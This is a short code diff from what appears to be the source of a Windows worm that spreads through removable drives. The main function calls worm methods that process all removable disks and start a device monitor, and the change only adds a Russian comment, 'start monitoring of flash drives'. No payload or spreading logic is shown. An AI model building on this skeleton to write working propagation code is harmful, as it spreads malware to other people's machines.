@@ -34,7 +34,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 	worm1.process_all_removable_disks();
 
-	return worm1.run_device_monitor(hInstance);
+	return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек
 
 	//worm1.scan_all_volumes();
 
